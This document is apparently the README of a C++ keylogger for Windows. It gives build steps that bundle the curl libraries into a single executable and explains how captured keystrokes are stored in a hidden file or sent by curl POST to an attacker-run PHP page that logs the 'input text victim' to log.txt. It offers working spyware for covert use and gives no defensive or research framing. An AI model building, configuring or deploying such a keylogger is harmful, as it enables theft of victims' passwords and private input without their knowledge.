# Keylogger

* Keylogger build in C++ for detect keys from keyboards (specific keys only available for french keyboard) and receive data from :
    * hidden file text
    * from intermediate hosting

* /!\ WORK ONLY FOR WINDOWS


## How to start

* Open terminal from root path project 
* <code> cd build\dllToExe </code>
* <code> pefrmdllembed.exe -impinj KeyloggerV1.exe libcurl-d.dll zlibd1.dll <NameKeylogger.exe> </code>
* Launch <NameKeylogger.exe>

## Configuration for hosting

* Intermediate hosting works with curl request and POST parameters. So you must have the same name parameter from your web hosting. By default it's "text".

* You have an example in web folder with index.php file. Copy paste or Write a script like that on your page which link your url.

* log.txt is the file where input text victim will be save.




